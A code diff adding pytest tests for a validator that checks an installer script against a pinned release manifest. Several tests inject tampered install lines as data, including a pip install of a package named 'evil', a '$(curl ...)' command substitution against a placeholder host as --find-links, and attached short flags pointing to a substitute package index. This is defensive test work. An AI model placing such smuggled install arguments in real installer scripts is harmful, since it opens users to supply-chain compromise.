@@ -406,3 +406,74 @@ def test_installer_matches_manifest_names_the_customer_package_in_the_manifest()
         ModelManifestInstaller(package="omninode-onex", sha256="A" * 64)
     with pytest.raises(ValidationError):
         ModelManifestInstaller(package="", sha256="a" * 64)
+
+
+def test_installer_matches_manifest_ignores_no_build_in_a_comment(
+    manifest: ModelReleaseCandidateManifest,
+) -> None:
+    script = _render()
+    script = _before_main(script, '"$uv" pip install evil # --no-build')
+    result = _pinned(manifest, script)
+    assert K.INSTALLER_BUILD in _kinds(result)
+    assert not result.matches
+
+
+@pytest.mark.parametrize(
+    "suffix",
+    [
+        ' --find-links "$(curl http://packages.example.invalid)"',
+        " --find-links $(echo http://packages.example.invalid)",
+    ],
+)
+def test_installer_matches_manifest_refuses_a_command_substitution_as_find_links(
+    manifest: ModelReleaseCandidateManifest,
+    suffix: str,
+) -> None:
+    script = _render()
+    script = _replace(script, INSTALL_LINE, INSTALL_LINE + suffix)
+    result = _pinned(manifest, script)
+    assert K.INSTALLER_INDEX in _kinds(result)
+
+
+@pytest.mark.parametrize(
+    ("line", "kind"),
+    [
+        ('ONEX_PACKAGE="omninode-onex"', K.INSTALLER_PACKAGE),
+        ("ONEX_VERSION+=9", K.INSTALLER_VERSION),
+    ],
+)
+def test_installer_matches_manifest_refuses_a_repeated_assignment(
+    manifest: ModelReleaseCandidateManifest,
+    line: str,
+    kind: K,
+) -> None:
+    script = _render()
+    script = _before_main(script, line)
+    result = _pinned(manifest, script)
+    assert _kinds(result) == {kind}
+
+
+@pytest.mark.parametrize(
+    "suffix",
+    [
+        " -ihttps://packages.example.invalid/simple",
+        " -fhttps://packages.example.invalid/wheels",
+    ],
+)
+def test_installer_matches_manifest_refuses_an_attached_short_flag(
+    manifest: ModelReleaseCandidateManifest,
+    suffix: str,
+) -> None:
+    script = _render()
+    script = _replace(script, INSTALL_LINE, INSTALL_LINE + suffix)
+    result = _pinned(manifest, script)
+    assert _kinds(result) == {K.INSTALLER_INDEX}
+
+
+def test_installer_matches_manifest_allows_a_file_test_outside_install_lines(
+    manifest: ModelReleaseCandidateManifest,
+) -> None:
+    script = _render()
+    script = _before_main(script, "[ -f /etc/os-release ] && echo linux")
+    result = _pinned(manifest, script)
+    assert result.matches
